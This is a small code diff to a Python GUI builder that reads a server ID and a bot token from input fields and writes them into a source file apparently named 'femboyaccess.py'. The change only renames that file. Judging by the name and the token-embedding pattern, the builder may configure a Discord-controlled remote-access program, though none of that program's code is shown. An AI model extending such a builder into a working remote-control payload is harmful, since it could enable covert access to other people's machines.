@@ -37,7 +37,7 @@ class GUIBuilder(MDBoxLayout):
         server_id = self.server_id_input.text
         bot_token = self.bot_token_input.text
 
-        with open('src_femboyaccess.py', 'r') as source_file:
+        with open('femboyaccess.py', 'r') as source_file:
             source_code = source_file.read()
 
         updated_source_code = source_code.replace('guild_id = ""', f'guild_id = "{server_id}"')
